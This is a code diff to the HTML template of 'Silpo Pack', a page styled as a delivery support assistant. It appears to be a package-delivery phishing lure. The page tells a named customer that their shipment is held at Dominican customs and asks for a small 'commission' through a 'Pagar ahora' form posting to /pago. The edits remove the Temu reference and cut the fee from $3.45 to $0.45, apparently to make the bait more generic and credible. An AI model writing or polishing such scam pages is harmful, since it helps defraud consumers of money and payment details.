@@ -199,7 +199,7 @@
       <div class="logo"></div>
       <div>
         <h1>Silpo Pack</h1>
-        <div class="subtitle">Asistente profesional de soporte y gestión de pedidos</div>
+        <div class="subtitle">Asistente profesional de soporte y gestión de envios</div>
       </div>
     </div>
 
@@ -215,8 +215,8 @@
     {% elif mensaje and not pago %}
     <!-- MENSAJE DE CONFLICTO -->
     <div style="margin-bottom:12px" class="muted">
-      {{ cliente.nombre }}, tu pedido de Temu tuvo un pequeño conflicto en la aduana dominicana.  
-      Para liberarlo rápidamente, necesitamos una pequeña comisión de $3.45.  
+      {{ cliente.nombre }}, tu envio tuvo un pequeño conflicto en la aduana dominicana.  
+      Para liberarlo rápidamente, necesitamos una pequeña comisión de $0.45.  
       <br><br><b>[Pagar ahora ✅]</b>
     </div>
     <form action="/pago" method="POST">
@@ -371,3 +371,4 @@ if (pagoForm) {
 
 </body>
 </html>
+
